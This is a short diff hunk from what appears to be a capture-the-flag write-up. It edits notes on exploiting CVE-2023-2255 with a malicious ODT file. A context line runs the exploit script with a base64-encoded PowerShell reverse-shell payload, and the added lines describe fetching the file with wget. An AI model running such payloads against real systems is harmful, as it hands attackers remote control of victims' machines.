@@ -731,6 +731,8 @@ python3 CVE-2023-2255.py --cmd 'cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIAB
 ```
 Ill make a malicious odt file using a rev shell from revshells.com with my IP and port
 
+Now i can use my session as `web_account` and wget the malicious odt
+
 ```python
 
 ```
